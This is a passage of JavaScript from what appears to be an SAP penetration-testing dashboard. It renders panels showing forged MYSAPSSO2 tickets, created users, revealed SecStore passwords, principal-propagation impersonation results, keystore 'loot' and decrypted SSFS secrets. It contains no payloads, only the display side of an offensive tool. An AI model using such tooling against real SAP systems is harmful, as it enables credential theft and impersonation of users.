      const byTactic = {};
      allTids.forEach(tid => {
        const info = techs[tid];
        const tacId = info ? info.tactic : 'OTHER';
        (byTactic[tacId] = byTactic[tacId] || []).push(tid);
      });
      const rows = order.filter(t => byTactic[t]).map(tacId => {
        const tname = tactics[tacId] || tacId;
        const pills = renderAttackPills(byTactic[tacId], {max: 6});
        return '<div class="detail-row"><span class="detail-key">' + escHtml(tname) + '</span><span class="detail-val">' + pills + '</span></div>';
      }).join('');
      return '<div class="detail-section">' +
        '<h4 style="color:#93c5fd;cursor:pointer" onclick="showAttackCoverage()" title="Open full ATT&amp;CK Coverage Matrix">&#9876;&#65039; ATT&amp;CK observed <span style="color:#8b949e;font-weight:normal;font-size:10px">(' + allTids.length + ' technique' + (allTids.length === 1 ? '' : 's') + ' across ' + Object.keys(byTactic).length + ' tactic' + (Object.keys(byTactic).length === 1 ? '' : 's') + ') &#8594;</span></h4>' +
        rows +
        '<div style="margin-top:6px;font-size:10px;color:#6e7681">Click any pill for the MITRE technique page.</div>' +
        '</div>';
    })()}
    <div class="detail-section">
      <h4>Instances</h4>
      ${(n.instances || []).map(i => {
        const ports = Object.keys(i.ports||{}).sort((a,b)=>a-b).join(', ');
        return `<div class="detail-row"><span class="detail-key">Inst ${escHtml(i.instance_nr)}</span><span class="detail-val">${escHtml(i.ip)}${ports ? ' — Ports: '+ports : ''}</span></div>`;
      }).join('')}
    </div>
    <div class="detail-section">
      <h4>Open Ports</h4>
      ${(() => {
        const allPorts = new Set();
        for (const inst of (n.instances || [])) for (const p of Object.keys(inst.ports || {})) allPorts.add(parseInt(p));
        if (allPorts.size === 0) return '<div style="color:#484f58">None detected</div>';
        return [...allPorts].sort((a,b)=>a-b).map(p => `<span style="display:inline-block;background:#21262d;border:1px solid #30363d;border-radius:4px;padding:1px 6px;margin:2px;font-size:11px;font-family:monospace">${p}</span>`).join('');
      })()}
    </div>
    <div class="detail-section">
      <h4>Clients</h4>
      ${(n.clients || []).map(c => { const nr = typeof c === 'object' ? (c.nr||'?') : String(c); const cat = typeof c === 'object' ? (c.category||'') : ''; const roleMap = {P:'Production',S:'SAP Reference Client',T:'Test',C:'Customising',D:'Demo',E:'Training',V:'Verified (user created)'}; const label = roleMap[cat]; const valHtml = cat === 'P' ? '<span style="color:#f85149">Production</span>' : cat === 'V' ? '<span style="color:#3fb950">&#9989; Verified</span>' : label ? escHtml(label) : (cat ? escHtml(cat) : ''); return `<div class="detail-row"><span class="detail-key">${escHtml(nr)}</span><span class="detail-val">${valHtml}</span></div>`; }).join('') || '<div style="color:#484f58">None enumerated</div>'}
    </div>
    <div class="detail-section">
      <h4>Created Users (${(n.created_users||[]).length})</h4>
      ${(n.created_users || []).map(u => `<div class="detail-row"><span class="detail-key">${escHtml(u.username)}</span><span class="detail-val">Client ${escHtml(u.client)} via ${escHtml(u.method)}</span></div>`).join('') || '<div style="color:#484f58">None</div>'}
    </div>
    ${(() => {
      // ── Forged MYSAPSSO2 Tickets ────────────────────────────
      // One row per ticket: shows user@SID/client, signer DN
      // (CN extracted from the full DN string for compactness),
      // validity countdown (red when expired), and used_on count.
      // Validity is computed client-side from forged_at +
      // validity_min so it ticks down in real time across polls.
      const ts = n.forged_tickets || [];
      if (ts.length === 0) return '';
      const now = Date.now() / 1000;
      const rows = ts.map((t, idx) => {
        const issued = t.forged_at ? Date.parse(t.forged_at)/1000 : 0;
        const validMin = t.validity_min || 0;
        const expiresAt = issued + validMin * 60;
        const remainingMin = (expiresAt - now) / 60;
        const expired = remainingMin <= 0;
        const ttlText = expired
          ? '<span style="color:#f85149">expired</span>'
          : `<span style="color:#3fb950">${Math.round(remainingMin)}m left</span>`;
        // Compact signer: prefer the CN= component if present
        const dnFull = t.signer_dn || '';
        const cnMatch = dnFull.match(/CN=([^,]+)/i);
        const signer = cnMatch ? cnMatch[1] : (dnFull.slice(0, 20) || '?');
        const usedCount = (t.used_on || []).length;
        return '<div class="detail-row" style="font-size:11px">'
          + `<span class="detail-key">#${idx} ${escHtml(t.user || '?')}@`
          + `${escHtml(t.sid || '?')}/${escHtml(t.client || '?')}</span>`
          + `<span class="detail-val">`
          + ttlText
          + ` &middot; signer ${escHtml(signer)}`
          + (usedCount > 0
              ? ` &middot; used ${usedCount}&times;` : '')
          + `</span></div>`;
      }).join('');
      return '<div class="detail-section">'
        + `<h4>&#127915; Forged MYSAPSSO2 Tickets (${ts.length})</h4>`
        + rows
        + '</div>';
    })()}
    ${(() => {
      const ss = n.secstore_entries || [];
      if (ss.length === 0) return '';
      const catColors = {rfc:'#f0883e',db:'#58a6ff',cts:'#3fb950',smtp:'#bc8cff',hmac:'#484f58',pse:'#484f58',oauth2_client:'#a371f7',other:'#484f58'};
      const catLabels = {rfc:'RFC',db:'DB',cts:'CTS',smtp:'SMTP',hmac:'HMAC',pse:'PSE',oauth2_client:'OAuth',other:'?'};
      const oa2cProfiles = n.oauth2_profiles || [];
      const oa2cTests = n.oa2c_test_results || [];
      return '<div class="detail-section"><h4>&#128273; SecStore (' + ss.length + ' entries)</h4>' +
        ss.filter(e => !e.error).map(e => {
          const cat = e.category || 'other';
          const col = catColors[cat] || '#484f58';
          const lbl = catLabels[cat] || '?';
          const pwd = e.password || '';
          const plen = e.password_len || pwd.length || 0;
          const masked = plen > 0 ? '&#9679;'.repeat(Math.min(plen, 8)) + ' (' + plen + ' chars)' : '(empty)';
          const ident = e.ident_clean || e.ident || '?';
          // OA2C enrichment: pair with profile metadata + test result
          let oa2cExtra = '';
          if (cat === 'oauth2_client' && e.client_uuid) {
            const prof = oa2cProfiles.find(
              p => (p.client_uuid || '').toLowerCase() === e.client_uuid);
            const test = oa2cTests.find(
              t => (t.client_uuid || '').toLowerCase() === e.client_uuid);
            if (prof) {
              const cid = prof.client_id || '';
              const ep = prof.token_endpoint || '';
              const desc = prof.description || '';
              oa2cExtra += '<br><span style="color:#a371f7;font-size:10px">'
                + (cid ? '&#128273; ' + escHtml(cid) : '')
                + (ep ? ' &rarr; ' + escHtml(ep) : '')
                + (desc ? ' (' + escHtml(desc) + ')' : '')
                + '</span>';
            } else if (oa2cProfiles.length === 0) {
              oa2cExtra += '<br><span style="color:#484f58;font-size:10px;font-style:italic">'
                + 'Run Read OA2C Profiles to identify this client</span>';
            }
            if (test) {
              if (test.valid) {
                oa2cExtra += '<br><span style="color:#3fb950;font-size:10px">'
                  + '&#10004; BTP token minted successfully</span>';
              } else {
                oa2cExtra += '<br><span style="color:#f85149;font-size:10px">'
                  + '&#10008; ' + escHtml(test.error || 'mint failed') + '</span>';
              }
            }
          }
          return '<div class="detail-row ss-reveal" style="cursor:pointer">' +
            '<span class="detail-key" style="color:' + col + ';min-width:50px">' + lbl + '</span>' +
            '<span class="detail-val" style="font-size:11px">' + escHtml(ident) +
            oa2cExtra +
            '<br><span class="ss-masked" style="color:#8b949e">' + masked + '</span>' +
            '<span class="ss-plain" style="display:none;color:#3fb950">' + escHtml(pwd) + '</span>' +
            '</span></div>';
        }).join('') +
        '</div>';
    })()}
    ${(() => {
      const ir = n.impact_results || [];
      const withData = ir.filter(r => r.record_count > 0);
      if (withData.length === 0) return '';
      const sevColors = { 5:'#e74c3c', 4:'#e67e22', 3:'#f1c40f', 2:'#3498db', 1:'#95a5a6' };
      return '<div class="detail-section"><h4 style="cursor:pointer" onclick="showImpactDetail(\'' + escHtml(n.sid) + '\')">&#128200; Business Impact (' + withData.length + ' findings) &#8594;</h4>' +
        withData.slice(0, 3).map(r => {
          const col = sevColors[r.severity] || '#95a5a6';
          return '<div class="detail-row"><span class="detail-key" style="color:' + col + '">' + (r.icon||'') + '</span><span class="detail-val" style="font-size:11px">' + escHtml(r.headline) + '</span></div>';
        }).join('') +
        (withData.length > 3 ? '<div style="font-size:11px;color:#58a6ff;cursor:pointer;margin-top:4px" onclick="showImpactDetail(\'' + escHtml(n.sid) + '\')">+ ' + (withData.length - 3) + ' more &rarr;</div>' : '') +
        '</div>';
    })()}
    ${(() => {
      const cr = n.capability_results || [];
      if (cr.length === 0) return '';
      const tierColors = {5:'#e74c3c', 4:'#e67e22', 3:'#f1c40f', 2:'#3498db', 1:'#95a5a6'};
      return '<div class="detail-section"><h4>&#128202; User Capability Inventory ('
        + cr.length + ' user' + (cr.length === 1 ? '' : 's') + ')</h4>'
        + cr.map(r => {
            const caps = r.capabilities || [];
            const top = caps.slice(0, 4);
            const more = caps.length - top.length;
            const userBadge = '<b style="color:#f0883e">' + escHtml(r.username)
                            + '</b>@<span style="color:#8b949e">'
                            + escHtml(r.client) + '</span>';
            const blast = '<span style="font-size:10px;color:#8b949e">'
                        + escHtml(r.blast_radius || '') + '</span>';
            const head = '<div style="margin:6px 0 4px">' + userBadge + '<br>' + blast + '</div>';
            const list = top.map(c => {
                const col = tierColors[c.severity] || '#95a5a6';
                const tbls = (c.tables || []).slice(0, 3).join(', ')
                           + ((c.tables || []).length > 3
                              ? ' +' + ((c.tables || []).length - 3) : '');
                return '<div class="detail-row" title="' + escHtml(c.why || '') + '">'
                    + '<span class="detail-key" style="color:' + col + ';min-width:46px">'
                    + escHtml(c.auth_object) + '</span>'
                    + '<span class="detail-val" style="font-size:11px">'
                    + escHtml(c.capability)
                    + '<br><span style="color:#6e7681;font-size:10px">'
                    + escHtml(tbls) + '</span></span></div>';
            }).join('');
            const tail = more > 0
              ? '<div style="font-size:10px;color:#6e7681;margin:4px 0 0">+ '
                + more + ' more capability' + (more === 1 ? '' : 'ies') + '</div>'
              : '';
            return head + list + tail;
        }).join('<hr style="border:0;border-top:1px solid #30363d;margin:8px 0">')
        + '</div>';
    })()}
    ${(() => {
      // --- USREXTID + PP impersonation surface ---
      const ux = n.usrextid_entries || [];
      const imp = n.pp_impersonation || {};
      const everRead = !!n.usrextid_read_at;
      if (ux.length === 0 && !imp.rule_template && !everRead) return '';
      const sevOf = (imp.exploitability === 'trivial')   ? '#f85149'
                   : (imp.exploitability === 'constrained') ? '#f0883e'
                   : '#3fb950';
      // Headline reframe: "blocked" is good news for the customer
      // (config weakness exists upstream, but no on-prem users to
      // land on).  Distinguish that from "never read" so the
      // operator knows whether to run the action again.
      const buckets = imp.usrextid_buckets || {};
      const headlineLabel = (() => {
        if (!everRead) return 'NOT YET PROBED';
        if (imp.exploitability === 'trivial') return 'TRIVIAL — pwn ready';
        if (imp.exploitability === 'constrained') return 'CONSTRAINED — bounded pwn';
        if (imp.exploitability === 'blocked' && ux.length === 0)
            return 'BLOCKED — USREXTID empty (no PP targets)';
        if (imp.exploitability === 'blocked'
              && (buckets.user_mapping || 0) === 0)
            return 'BLOCKED — no DN/LD-typed USREXTID rows (PP cert can\'t resolve)';
        if (imp.exploitability === 'blocked')
            return 'BLOCKED — PP rule does not match any USREXTID DN/LD entry';
        return (imp.exploitability || 'unknown').toUpperCase();
      })();
      const headlineColor = !everRead ? '#8b949e' : sevOf;
      const matched = imp.matched_users || [];
      const privs = imp.privileged_users || [];
      const privSet = new Set(privs.map(p => (p.bname || '').toUpperCase()));
      const rows = ux.slice(0, 50).map(r => {
        const isPriv = privSet.has((r.BNAME || '').toUpperCase());
        const isMatched = matched.some(m => m.bname === r.BNAME && m.extid_full === r.EXTID);
        const rowColor = isPriv ? '#f85149' : (isMatched ? '#f0883e' : '#cfd9df');
        return `<tr>
                  <td style="padding:3px 6px;border-bottom:1px solid #21262d;font-family:monospace;color:${rowColor}">${escHtml(r.BNAME || '')}${isPriv ? ' &#9889;' : ''}</td>
                  <td style="padding:3px 6px;border-bottom:1px solid #21262d;font-family:monospace;font-size:10px;word-break:break-all">${escHtml(r.EXTID || '')}</td>
                  <td style="padding:3px 6px;border-bottom:1px solid #21262d;font-family:monospace;font-size:10px;color:#8b949e">${escHtml(r.TYPE || '')}</td>
                  <td style="padding:3px 6px;border-bottom:1px solid #21262d;font-family:monospace;font-size:10px;color:#8b949e">${escHtml(r.MANDT || '')}</td>
                </tr>`;
      }).join('');
      return `
      <div class="detail-section">
        <h4>&#128279; PP Impersonation Surface
          <span style="color:${headlineColor};font-weight:normal;font-size:10px">(${escHtml(headlineLabel)})</span>
        </h4>
        ${!everRead ? `<button class="ctx-btn" onclick="api('POST','node/${escHtml(n.sid)}/read_usrextid');showToast('USREXTID read started','info')" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;cursor:pointer;font-size:11px;margin-bottom:8px">&#9851; Read USREXTID now</button>` : ''}
        ${imp.notes && everRead ? `<div style="font-size:11px;color:#cfd9df;margin:6px 0;padding:6px 8px;background:#0d1117;border-left:3px solid ${sevOf}">${escHtml(imp.notes)}</div>` : ''}
        ${imp.rule_template ? `<div class="detail-row"><span class="detail-key">SCC PP rule</span><span class="detail-val" style="font-family:monospace;color:#79c0ff">${escHtml(imp.rule_template)}</span></div>` : ''}
        ${imp.scc_host ? `<div class="detail-row"><span class="detail-key">Via SCC</span><span class="detail-val" style="font-family:monospace"><a href="javascript:void(0)" onclick="showSCCDetail('${escHtml(imp.scc_host)}')" style="color:#58a6ff;text-decoration:underline;cursor:pointer">${escHtml(imp.scc_host)}</a> &nbsp;<span style="color:#8b949e;font-size:10px">(click to jump)</span></span></div>` : ''}
        <div class="detail-row"><span class="detail-key">USREXTID rows</span><span class="detail-val">${ux.length}${(buckets.user_mapping !== undefined) ? ` <span style="color:#8b949e;font-size:10px">(DN/LD: ${buckets.user_mapping || 0}, CA: ${buckets.ca_trust || 0}, other: ${buckets.other || 0})</span>` : ''}</span></div>
        <div class="detail-row"><span class="detail-key">Impersonatable</span><span class="detail-val">${matched.length}${privs.length ? ` <span style="color:#f85149">(${privs.length} privileged)</span>` : ''}</span></div>
        ${everRead ? `<div class="detail-row"><span class="detail-key">Last read</span><span class="detail-val" style="font-size:10px;color:#8b949e">${escHtml(n.usrextid_read_at || '')}</span></div>` : ''}
        ${(() => {
          // --- Live verification result ---
          const v = n.pp_verification || {};
          if (!v.verified_at && !v.verdict) return '';
          const verdict = v.verdict || '?';
          const ok = !!v.ok || verdict === 'confirmed';
          const col = ok ? '#f85149'
                          : (verdict === 'auth_rejected' ? '#f0883e' : '#8b949e');
          const headline = ok
            ? `PP IMPERSONATION CONFIRMED — HTTP ${v.http_status || '?'} (${v.latency_ms || '?'} ms)`
            : `PROBE: ${verdict.toUpperCase()}`;
          const userBlock = v.user
            ? `<div style="font-family:monospace;color:#e6edf3"><b>Landed as:</b> ${escHtml(v.user)} <span style="color:#8b949e;font-size:10px">(confidence ${escHtml(v.confidence || '?')})</span></div>`
            : (ok ? '<div style="color:#8b949e;font-size:10px">User name could not be detected from response headers — HTTP 200 confirms impersonation but we did not see a sap-username header.</div>' : '');
          return `
          <div style="margin-top:8px;padding:8px 10px;background:#0d1117;border-left:3px solid ${col}">
            <div style="font-weight:bold;color:${col};font-size:12px">&#127919; ${escHtml(headline)}</div>
            ${userBlock}
            <div style="color:#8b949e;font-size:10px;margin-top:4px">
              Destination: <code>${escHtml(v.destination_used || '?')}</code>${v.destination_was_temp ? ' (temp, deleted)' : ''} · verified at ${escHtml(v.verified_at || '?')}
            </div>
            ${v.error ? `<div style="color:#f85149;font-size:10px;margin-top:4px">${escHtml(v.error)}</div>` : ''}
          </div>`;
        })()}
        ${ux.length === 0 ? '' : `
        <table style="width:100%;border-collapse:collapse;margin-top:6px;font-size:11px">
          <thead>
            <tr style="background:#161b22;color:#8b949e;text-align:left">
              <th style="padding:3px 6px;border-bottom:1px solid #30363d">ABAP user</th>
              <th style="padding:3px 6px;border-bottom:1px solid #30363d">EXTID</th>
              <th style="padding:3px 6px;border-bottom:1px solid #30363d">Type</th>
              <th style="padding:3px 6px;border-bottom:1px solid #30363d">Client</th>
            </tr>
          </thead>
          <tbody>${rows}</tbody>
        </table>${ux.length > 50 ? `<div style="color:#8b949e;font-size:10px;margin-top:4px">… and ${ux.length - 50} more rows</div>` : ''}`}
      </div>`;
    })()}
  `;

  // Wire up click-to-reveal on SecStore entries and restore any that
  // were already revealed before the auto-refresh rebuilt the HTML.
  panel.querySelectorAll('.ss-reveal').forEach((row, i) => {
    row.addEventListener('click', () => {
      const m = row.querySelector('.ss-masked');
      const p = row.querySelector('.ss-plain');
      if (m.style.display === 'none') { m.style.display = ''; p.style.display = 'none'; }
      else { m.style.display = 'none'; p.style.display = ''; }
    });
    if (revealedSS.has(i)) {
      const m = row.querySelector('.ss-masked');
      const p = row.querySelector('.ss-plain');
      if (m) m.style.display = 'none';
      if (p) p.style.display = '';
    }
  });

  panel.classList.add('visible');
  if (refresh && preservedScroll) panel.scrollTop = preservedScroll;
}

// SAP Cloud Connector — read-only detail drawer (Week 1: no actions yet).
function showSCCDetail(host, opts) {
  const sn = (mapState.scc_nodes || {})[host];
  if (!sn) return;
  const panel = document.getElementById('detail-panel');
  const refresh = !!(opts && opts.refresh);
  if (!refresh && panel.classList.contains('visible') && panel.dataset.sid === 'scc:' + host) {
    _closeDetailPanel();
    return;
  }
  const preservedScroll = refresh ? (panel.scrollTop || 0) : 0;
  panel.dataset.sid = 'scc:' + host;
  panel.setAttribute('data-view', 'scc');
  const tls = sn.tls_fingerprint || {};
  const cves = [].concat(sn.cves_confirmed || [], sn.cves_suspected || []);
  panel.innerHTML = `
    <span class="close-btn" onclick="_closeDetailPanel()">&times;</span>
    <h3>&#9729; SAP Cloud Connector — ${escHtml(host)}</h3>
    ${renderPhaseProgress(getSCCPhaseProgress(sn))}
    <div class="detail-section">
      <div class="detail-row"><span class="detail-key">Host</span><span class="detail-val">${escHtml(sn.host || host)}</span></div>
      <div class="detail-row"><span class="detail-key">Admin UI</span><span class="detail-val">https://${escHtml(host)}:${sn.admin_ui_port || 8443}/scc/ui</span></div>
      <div class="detail-row"><span class="detail-key">Version</span><span class="detail-val">${escHtml(sn.version || 'unknown')}${sn.version_source ? ' <span style="color:#8b949e">(' + escHtml(sn.version_source) + ')</span>' : ''}</span></div>
      <div class="detail-row"><span class="detail-key">Server hdr</span><span class="detail-val">${escHtml(sn.server_header || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">UI reachable</span><span class="detail-val">${sn.admin_ui_reachable ? '<span style="color:#3fb950">Yes</span>' : 'No'}</span></div>
      <div class="detail-row"><span class="detail-key">Pwned</span><span class="detail-val">${sn.pwned ? '<span style="color:#f0883e">&#9889; YES</span>' : 'No'}</span></div>
    </div>
    <div class="detail-section">
      <h4>TLS Fingerprint</h4>
      <div class="detail-row"><span class="detail-key">Protocol</span><span class="detail-val">${escHtml(tls.tls_version || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Cipher</span><span class="detail-val">${escHtml(tls.cipher || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">ALPN</span><span class="detail-val">${escHtml(tls.alpn || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Subject</span><span class="detail-val" style="font-size:10px;word-break:break-all">${escHtml(tls.cert_subject || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Issuer</span><span class="detail-val" style="font-size:10px;word-break:break-all">${escHtml(tls.cert_issuer || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">SAN</span><span class="detail-val" style="font-size:10px">${escHtml((tls.cert_san || []).join(', ') || '?')}</span></div>
    </div>
    <div class="detail-section">
      <h4>Fingerprints</h4>
      <div class="detail-row"><span class="detail-key">Bundle</span><span class="detail-val" style="font-family:monospace;font-size:11px">${escHtml(sn.bundle_hash || '—')}</span></div>
      <div class="detail-row"><span class="detail-key">Favicon SHA256</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all">${escHtml((sn.favicon_sha256 || '').slice(0, 32) + ((sn.favicon_sha256 || '').length > 32 ? '…' : ''))}</span></div>
      <div class="detail-row"><span class="detail-key">Favicon mmh3</span><span class="detail-val">${sn.favicon_mmh3 || '—'}</span></div>
    </div>
    ${cves.length ? `
    <div class="detail-section">
      <h4>CVE buckets <span style="color:#8b949e;font-weight:normal;font-size:10px">(${(sn.cves_confirmed || []).length} confirmed, ${(sn.cves_suspected || []).length} suspected)</span></h4>
      ${(() => {
        const sevColor = { CRITICAL: '#f85149', HIGH: '#f0883e', MEDIUM: '#d29922', INFO: '#58a6ff' };
        const det = (sn.cve_details || []);
        if (det.length) {
          return det.map(d => {
            const isConf = d.status === 'confirmed';
            const tag = isConf ? 'CONFIRMED' : 'suspected';
            const tagColor = isConf ? '#f85149' : '#d29922';
            const sCol = sevColor[(d.severity || '').toUpperCase()] || '#8b949e';
            return `<div style="border-left:3px solid ${sCol};padding:6px 8px;margin:6px 0;background:#0d1117">
                      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
                        <span style="font-family:monospace;font-weight:bold"><a href="${escHtml(d.ref || '#')}" target="_blank" style="color:#58a6ff;text-decoration:none">${escHtml(d.cve)}</a></span>
                        <span style="font-size:10px"><span style="color:${tagColor};font-weight:bold">${tag}</span> · <span style="color:${sCol}">${escHtml(d.severity || '?')}</span></span>
                      </div>
                      <div style="font-size:11px;color:#cfd9df">${escHtml(d.headline || '')}</div>
                    </div>`;
          }).join('');
        }
        // Legacy fallback (state file from before cve_details existed).
        return (sn.cves_confirmed || []).map(c => `<div class="detail-row"><span class="detail-key" style="color:#f85149">CONFIRMED</span><span class="detail-val" style="font-family:monospace">${escHtml(c)}</span></div>`).join('') +
               (sn.cves_suspected || []).map(c => `<div class="detail-row"><span class="detail-key" style="color:#d29922">suspected</span><span class="detail-val" style="font-family:monospace">${escHtml(c)}</span></div>`).join('');
      })()}
    </div>` : ''}
    ${sn.keystore_extracted ? `
    <div class="detail-section" style="border-left:3px solid #f85149;padding-left:8px">
      <h4 style="color:#f85149">&#128272; Keystore Loot</h4>
      <div class="detail-row"><span class="detail-key">Loot path</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all">${escHtml(sn.keystore_loot_path || '?')}</span></div>
      ${sn.tunnel_privkey_fp ? `<div class="detail-row"><span class="detail-key">System P12 sha256</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all">${escHtml(sn.tunnel_privkey_fp)}</span></div>` : ''}
      ${sn.pp_ca_privkey_fp ? `<div class="detail-row"><span class="detail-key">SSFS sha256</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all" title="SAP Secure Storage File System — contains the principal-propagation CA private key when configured">${escHtml(sn.pp_ca_privkey_fp)}</span></div>` : ''}
      ${sn.ssfs_decrypted ? `
        <div class="detail-row"><span class="detail-key" style="color:#f85149">SSFS</span><span class="detail-val" style="color:#3fb950">DECRYPTED · ${(sn.ssfs_secrets_keys || []).length} secret(s)</span></div>
        <div class="detail-row"><span class="detail-key">Secrets file</span><span class="detail-val" style="font-family:monospace;font-size:10px;word-break:break-all" title="mode 0600 — review locally, never paste">${escHtml(sn.ssfs_secrets_path || '?')}</span></div>
        <div class="detail-row"><span class="detail-key">Recovered keys</span><span class="detail-val" style="font-family:monospace;font-size:10px">${(sn.ssfs_secrets_keys || []).map(k => escHtml(k)).join('<br>') || '-'}</span></div>
        ${(sn.unlocked_keystores || []).length === 0 ? '' : `
          <div style="margin-top:6px;color:#8b949e;font-size:11px">Unlocked keystores (${(sn.unlocked_keystores || []).length}):</div>
          <table style="width:100%;border-collapse:collapse;margin-top:4px;font-size:11px">
            <thead>
              <tr style="background:#161b22;color:#8b949e;text-align:left">
                <th style="padding:4px 6px;border-bottom:1px solid #30363d">Path</th>
                <th style="padding:4px 6px;border-bottom:1px solid #30363d">Subject</th>
                <th style="padding:4px 6px;border-bottom:1px solid #30363d">Cert sha256</th>
                <th style="padding:4px 6px;border-bottom:1px solid #30363d">Key</th>
                <th style="padding:4px 6px;border-bottom:1px solid #30363d">Valid until</th>
              </tr>
            </thead>
            <tbody>
              ${(sn.unlocked_keystores || []).map(k => `
                <tr>
                  <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-family:monospace;font-size:10px;word-break:break-all">${escHtml(k.path || '?')}</td>
                  <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-size:10px;word-break:break-all">${escHtml(k.cert_subject || k.error || '-')}</td>
                  <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-family:monospace;font-size:10px">${escHtml((k.cert_sha256 || '').slice(0,16))}${k.cert_sha256 ? '…' : ''}</td>
                  <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-family:monospace;font-size:10px">${escHtml(k.key_type || '-')}${k.key_size ? '/' + k.key_size : ''}</td>
                  <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-size:10px">${escHtml((k.cert_not_after || '').slice(0,10))}</td>
                </tr>`).join('')}
            </tbody>
          </table>`}
      ` : '<div class="detail-row"><span class="detail-key">SSFS</span><span class="detail-val" style="color:#8b949e">not yet decrypted (right-click → Decrypt SSFS)</span></div>'}
    </div>` : ''}
    ${(sn.ha_role || sn.ha_shadow_host) ? `
    <div class="detail-section">
      <h4>High Availability</h4>
      <div class="detail-row"><span class="detail-key">Role</span><span class="detail-val" style="color:${sn.ha_role === 'master' ? '#3fb950' : (sn.ha_role === 'shadow' ? '#a371f7' : '#8b949e')}">${escHtml((sn.ha_role || 'standalone').toUpperCase())}</span></div>
      ${sn.ha_shadow_host ? `<div class="detail-row"><span class="detail-key">Peer (${escHtml((sn.ha_peer_role || '?').toUpperCase())})</span><span class="detail-val" style="font-family:monospace"><a href="javascript:void(0)" onclick="showSCCDetail('${escHtml(sn.ha_shadow_host)}')" style="color:#58a6ff">${escHtml(sn.ha_shadow_host)}</a></span></div>` : '<div class="detail-row"><span class="detail-key">Peer</span><span class="detail-val" style="color:#8b949e">none (standalone)</span></div>'}
    </div>` : ''}
    ${(() => {
      // --- Principal Propagation analysis ---
      const ppa = sn.pp_analysis || {};
      const ppFindings = ppa.findings || [];
      const ppCfg = (ppa.pp_config || {});
      const summary = ppa.summary || {};
      if (!ppa.ok && !ppFindings.length && !ppCfg.subject_patterns) return '';
      const sevColor = { CRITICAL: '#f85149', HIGH: '#f0883e', MEDIUM: '#d29922' };
      const subjRows = (ppCfg.subject_patterns || []).map((sp, idx) => {
        const dn = (sp.dn_entries || [])
          .map(e => `<span style="color:#79c0ff">${escHtml(e.key)}</span>=<span style="color:#cfd9df">${escHtml(e.value)}</span>`)
          .join(', ');
        const cond = sp.condition ? `<div style="font-size:10px;color:#8b949e">condition: ${escHtml(sp.condition)}</div>` : '';
        return `<div style="border-left:3px solid #5dade2;padding:6px 8px;margin:6px 0;background:#0d1117;font-family:monospace;font-size:11px">${dn || '<span style="color:#8b949e">(empty)</span>'}${cond}</div>`;
      }).join('') || '<div style="color:#8b949e;font-size:11px">No subjectPatterns configured.</div>';
      const findingRows = ppFindings.map(f => {
        const sCol = sevColor[(f.severity || '').toUpperCase()] || '#8b949e';
        const why = (f.why || []).map(w => `<li>${escHtml(w)}</li>`).join('');
        return `<div style="border-left:3px solid ${sCol};padding:6px 8px;margin:6px 0;background:#0d1117">
                  <div style="display:flex;justify-content:space-between;align-items:baseline">
                    <span style="font-weight:bold;color:${sCol}">${escHtml(f.severity || '?')}</span>
                    <span style="font-family:monospace;font-size:10px;color:#8b949e">${escHtml(f.ref || '')}</span>
                  </div>
                  <div style="font-size:11px;color:#cfd9df;margin:4px 0">${escHtml(f.headline || '')}</div>
                  ${why ? `<ul style="font-size:10px;color:#8b949e;margin:4px 0 4px 16px;padding:0">${why}</ul>` : ''}
                  ${f.recommendation ? `<div style="font-size:10px;color:#3fb950;margin-top:4px">&#10004; ${escHtml(f.recommendation)}</div>` : ''}
                </div>`;
      }).join('') || '<div style="color:#3fb950;font-size:11px">No PP weaknesses found.</div>';
      const tsTip = ppa.analyzed_at ? `last run: ${escHtml(ppa.analyzed_at)}` : '';
      return `
      <div class="detail-section">
        <h4>Principal Propagation
          <span style="color:#8b949e;font-weight:normal;font-size:10px" title="${tsTip}">
            (${summary.critical || 0} CRITICAL · ${summary.high || 0} HIGH · ${summary.medium || 0} MEDIUM)
          </span>
        </h4>
        <div class="detail-row"><span class="detail-key">Mode</span><span class="detail-val" style="font-family:monospace">${escHtml(ppCfg.mode || '?')}</span></div>
        <div class="detail-row"><span class="detail-key">Validity</span><span class="detail-val">${ppCfg.validity_mins || 0} min</span></div>
        <div class="detail-row"><span class="detail-key">SSO tolerance</span><span class="detail-val">${ppCfg.sso_tolerance_h || 0} h</span></div>
        <div style="color:#8b949e;font-size:11px;margin-top:6px">Subject patterns:</div>
        ${subjRows}
        <div style="color:#8b949e;font-size:11px;margin-top:6px">Findings:</div>
        ${findingRows}
      </div>`;
    })()}
    <div class="detail-section">
      <h4>Subaccounts &amp; Mappings</h4>
      <div class="detail-row"><span class="detail-key">Region</span><span class="detail-val">${escHtml(sn.tunnel_region || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Subaccount UUIDs</span><span class="detail-val">${(sn.subaccount_uuids || []).map(u => escHtml(u)).join('<br>') || '0'}</span></div>
      <div class="detail-row"><span class="detail-key">Mappings</span><span class="detail-val">${(sn.mappings || []).length}</span></div>
      ${((sn.mappings || []).length === 0) ? '' : `
      <table style="width:100%;border-collapse:collapse;margin-top:6px;font-size:11px">
        <thead>
          <tr style="background:#161b22;color:#8b949e;text-align:left">
            <th style="padding:4px 6px;border-bottom:1px solid #30363d">Virtual</th>
            <th style="padding:4px 6px;border-bottom:1px solid #30363d">Internal</th>
            <th style="padding:4px 6px;border-bottom:1px solid #30363d">Proto</th>
            <th style="padding:4px 6px;border-bottom:1px solid #30363d">SID</th>
            <th style="padding:4px 6px;border-bottom:1px solid #30363d">Auth</th>
            <th style="padding:4px 6px;border-bottom:1px solid #30363d" title="Tunnel-relay smoke test result">Reach</th>
            <th style="padding:4px 6px;border-bottom:1px solid #30363d">Resources</th>
          </tr>
        </thead>
        <tbody>
          ${(sn.mappings || []).map(m => {
            const auth = m.authentication_mode || '';
